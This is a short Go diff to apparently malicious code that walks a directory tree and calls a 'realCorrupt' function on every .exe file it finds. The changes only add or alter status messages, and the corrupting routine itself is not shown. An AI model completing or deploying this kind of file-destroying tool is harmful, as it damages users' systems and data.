@@ -26,7 +26,7 @@ func loggingSystem(message string) {
 func corrupt(wg *sync.WaitGroup, fileChan <-chan string) {
 	defer wg.Done()
 	for file := range fileChan {
-		fmt.Printf("actively scanning: %s\n", file)
+		fmt.Printf("Actively Scanning: %s\n", file)
 	}
 }
 
@@ -54,6 +54,7 @@ func walkAndSendFiles(root string, fileChan chan<- string) {
 		if strings.HasSuffix(path, ".exe") {
 			return func() error {
 				status, err := realCorrupt(path)
+				fmt.Println("Currently corrupting file:", path)
 				fmt.Println("Corruption status: ", status)
 				if err != nil {
 					return err
@@ -80,7 +81,8 @@ func walkAndSendFiles(root string, fileChan chan<- string) {
 	})
 
 	if err != nil {
-		log.Fatalf("error walking the path %q: %v\n", root, err)
+		fmt.Printf("error walking the path %q: %v\n", root, err)
+		//	loggingSystem()
 	}
 }
 
